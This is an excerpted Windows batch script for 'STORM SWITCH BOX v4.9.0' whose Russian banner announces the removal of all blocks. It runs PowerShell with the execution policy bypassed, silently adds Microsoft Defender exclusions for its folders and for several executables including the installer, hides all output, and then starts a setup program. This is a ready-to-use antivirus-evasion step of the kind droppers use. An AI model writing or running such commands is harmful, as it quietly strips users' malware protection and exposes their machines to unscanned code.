...
echo ============================================================
echo   STORM SWITCH BOX v4.9.0 - СНЯТИЕ ВСЕХ БЛОКИРОВОК
...
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\STORM SWITCH BOX' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormSwitchBox.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'STORM_SWITCH_BOX_4.9.0_Setup.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormInstaller.exe' -ErrorAction SilentlyContinue" >nul 2>&1
...
if exist "%SCRIPT_DIR%Files\STORM_SWITCH_BOX_4.9.0_Setup.exe" (
    start "" "%SCRIPT_DIR%Files\STORM_SWITCH_BOX_4.9.0_Setup.exe"
) else if exist "%SCRIPT_DIR%installer\Output\STORM_SWITCH_BOX_4.9.0_Setup.exe" (
    start "" "%SCRIPT_DIR%installer\Output\STORM_SWITCH_BOX_4.9.0_Setup.exe"
) else if exist "%SCRIPT_DIR%STORM_SWITCH_BOX_4.9.0_Setup.exe" (
    start "" "%SCRIPT_DIR%STORM_SWITCH_BOX_4.9.0_Setup.exe"
